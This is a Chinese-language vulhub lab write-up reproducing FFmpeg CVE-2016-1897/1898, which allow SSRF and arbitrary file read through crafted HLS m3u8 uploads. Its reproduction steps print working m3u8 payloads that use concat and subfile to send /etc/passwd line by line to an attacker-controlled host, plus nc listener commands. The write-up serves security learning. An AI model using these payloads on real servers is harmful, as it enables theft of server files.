# ffmpeg 任意文件读取漏洞/SSRF漏洞 （CVE-2016-1897/CVE-2016-1898）

## 原文链接&靶场链接

http://blog.neargle.com/SecNewsBak/drops/CVE-2016-1897.8%20-%20FFMpeg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html

https://blog.csdn.net/EC_Carrot/article/details/117510184

https://www.freebuf.com/articles/web/258320.html

https://vulhub.org/#/environments/ffmpeg/CVE-2016-1897/

## 影响范围

- FFmpeg 2.8.x < 2.8.5
- FFmpeg 2.7.x < 2.7.5
- FFmpeg 2.6.x < 2.6.7
- FFmpeg 2.5.x < 2.5.10

## 什么是FFmpeg

FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。功能非常强大，是每个视频网站必不可少的多媒体文件处理程序。

## 漏洞概述

在FFMpeg2.X 由于在解析HTTP Live Streaming流媒体m3u8文件处理不当，可导致SSRF漏洞与任意文件读取漏洞。当网站允许用户上传多媒体文件，并使用FFMpeg进行处理时会触发该漏洞。

这个漏洞有两个CVE编号，分别是CVE-2016-1897和CVE-2016-1898，它们两个的区别在于读取文件的行数，CVE-2016-1897只能读取文件的第一行，而CVE-2016-1898可以读取文件任意行，原理基本一样。

## 什么是HLS

漏洞是出现在解析HLS流媒体文件时的问题,所以必须先了解HLS

HLS（HTTP Live Streaming）是Apple公司开发的一种基于HTTP协议的流媒体通信协议，大多数都应用在PC上和Iphone上。它的基本原理是把一个视频流分成很多个很小很小很小的ts流文件，然后通过HTTP下载，每次下载一点点。在一个开始一个新的流媒体会话时，客户端都会先下载一个m3u8（播放列表 Playlist）文件，里面包含了这次HLS会话的所有数据。

如图所示，有一个主要的m3u8格式Playlist文件，里面可以包含下级的m3u8文件，客户端会再去索引下级的m3u8，继续解析下级的Playlist文件获取最终的TS流文件的http请求地址与时间段。

```
http://pl.youku.com/playlist/m3u8?vid=340270152&type=3gphd&ts=1462714824&keyframe=0&ep=dSaSGE6MUssC5ybeiz8bYiXiIiZdXP0O9h2CgdNnAtQnS%2Bm2&sid=746271452251312590fab&token=3319&ctype=12&ev=1&oip=3395898128
```

这是youku一个视频的m3u8文件，内容如下：

```
#EXTM3U
#EXT-X-TARGETDURATION:6
#EXT-X-VERSION:2
#EXTINF:6,
http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=0&ts_end=5.9&ts_seg_no=0&ts_keyframe=1
#EXTINF:0,
http://183.60.145.83/69777D60D183E7FE8D0BC25A4/030002010056208D059E4E15049976CD642E01-C8E5-706F-DC6D-375DE0DA5A1E.flv.ts?ts_start=5.9&ts_end=6.367&ts_seg_no=1&ts_keyframe=1
#EXT-X-ENDLIST
```

解析：

```
#EXTM3U 标签是m3u8的文件头，开头必须要这一行
#EXT-X-TARGETDURATION 表示整个媒体的长度 这里是6秒
#EXT-X-VERSION:2 该标签可有可无
#EXTINF:6, 表示该一段TS流文件的长度
#EXT-X-ENDLIST 这个相当于文件结束符
这些是m3u8的最基本的标签，而问题就出在FFMpeg去请求TS流文件的时，由于我们可以伪造一个m3u8文件，FFMpeg不会判断里面的流地址，直接请求。
```

## 漏洞复现
**back.txt 和 upload.m3u8 文件要先在本地用编辑器编辑好，
用vim 会有格式问题，无法读取文件**

启动靶场后访问192.168.123.133:8080,一个上传页面

![image-20220501162242565](https://user-images.githubusercontent.com/85486547/166141322-384de497-2e84-4e47-bcd0-5be44bb57ca9.png)



由于vulhub并没有讲述该漏洞如何复现，我们需要进入环境查看源码

```php
cat index.php 
<?php
if(!empty($_FILES)) {
    $filename = escapeshellarg($_FILES['file']['tmp_name']);
    $newname = './' . uniqid() . '.mp4';
    shell_exec("ffmpeg -i $filename $newname");
}
```

可以看到实际上只是借用了 ffmpeg -i 这个命令来处理视频文件。





首先构造一个恶意的 m3u8 的文件(用记事本编写，保存为`.m3u8`后缀)：

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://your_ip:9999/test.txt
#EXT-X-ENDLIST
```

```
参数说明
#EXTM3U 标签是 m3u8 的文件头，开头必须要这一行
#EXT-X-MEDIA-SEQUENCE 表示每一个media URI 在 PlayList中只有唯一的序号，相邻之间序号+1
#EXTINF:10.0, 表示该一段 TS 流文件的长度
#EXT-X-ENDLIST 这个相当于文件结束符
```

由于`FFMpeg` 去请求 TS 流文件（URL）时，`FFMpeg` 不会判断里面的流地址，直接请求。所以我们可以试想，用`FFMpeg`内自带的concat函数，将一个不包含文件结束符的文件与file协议读取的文件衔接起来，请求回攻击机，就能够达到读取任意文件的效果！

### 步骤一

在我们自己的web服务器上创建一个back.txt，文本内容是m3u8的格式，其中不包含文本结束符

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
http://192.168.123.128:9999/?
```

开启http服务

```
python3 -m http.server 8888
```

监听9999端口

```
nc -lvnp 9999
```

### 步骤二

上传恶意upload.m3u8文件

```
#EXTM3U
#EXT-X-TARGETDURATION:6
#EXTINF:10.0,
concat:http://192.168.123.128:8888/back.txt|file:///etc/passwd
#EXT-X-ENDLISTa
```



web端读取到数据
![image-20220501171153607](https://user-images.githubusercontent.com/85486547/166141336-f06897f9-78b3-4cc1-913d-b03fe3fd7052.png)



### 步骤三

可以发现以上的操作方式，只能将 /etc/passwd 数据中的第一行带外出来，但是后面的内容还是没有读出来，因此我们借助其他函数进行进一步利用。ffmpeg 还提供了 subfile 函数，其中 Start 后是开始截取的偏移量，以字节为单位，end 是结束的偏移量。

```
subfile,,start,153391104,end,268142592,,:/media/dvd/VIDEO_TS/VTS_08_1.VOB
Start后是开始截取的偏移量，以字节为单位，end是结束的偏移量。

既然可以截取数据流就可以利用subfile获取比较完整的文件了。测试时候一次最多只能截取32字节，所以要继续用concat合并多个数据流片段。
```

只需要改恶意的 upload.m3u8 文件

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://192.168.123.128:8888/back.txt|subfile,,start,0,end,31,,:///etc/passwd|subfile,,start,32,end,79,,:///etc/passwd
#EXT-X-ENDLIST
```

在逐渐增加 subfile 偏移量的测试过程中，发现超过一定长度后，数据读取部分不再增加。猜测可能和 URL 长度或者和换行符有关。

在不断测试的过程中，最终发现，与 URL 长度，m3u8 请求 URL 都无关系，也没有 32 字节的限制。实际上 concat 连接 URL 时是不能包含换行符的。/etc/passwd 文件存储过程中换行符 \n 是占一个字符的，所以无论是通过 file 协议，还是 subfile 切片，只要是读取到 \n 则中断，后面的内容无法输出。

按照这个思路，我们能只需要通过 subfile 读取文件时，跳过 \n 符号，不断根据返回的数据进行调试，最终可以读取到完整的数据。以如下的 /etc/passwd 的文件为例，附上 payload 参考：

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://192.168.123.128:8888/back.txt|subfile,,start,0,end,31,,:///etc/passwd|subfile,,start,32,end,79,,:///etc/passwd|subfile,,start,80,end,116,,:///etc/passwd|subfile,,start,117,end,153,,:///etc/passwd|subfile,,start,154,end,188,,:///etc/passwd|subfile,,start,189,end,236,,:///etc/passwd|subfile,,start,237,end,284,,:///etc/passwd|subfile,,start,285,end,329,,:///etc/passwd|subfile,,start,330,end,373,,:///etc/passwd|subfile,,start,374,end,423,,:///etc/passwd|subfile,,start,424,end,475,,:///etc/passwd|subfile,,start,476,end,518,,:///etc/passwd|subfile,,start,519,end,571,,:///etc/passwd|subfile,,start,572,end,624,,:///etc/passwd|subfile,,start,625,end,686,,:///etc/passwd|subfile,,start,687,end,735,,:///etc/passwd|subfile,,start,736,end,817,,:///etc/passwd|subfile,,start,818,end,876,,:///etc/passwd|subfile,,start,877,end,918,,:///etc/passwd|subfile,,start,919,end,965,,:///etc/passwd
#EXT-X-ENDLIST
```

![image-20220501174002759](https://user-images.githubusercontent.com/85486547/166141365-c03d4a11-7572-4d6f-956c-80bbccb8aa44.png)


## 修复

目前该漏洞已在FFMpeg**2.8.5**中修复，请广大用户马上升级
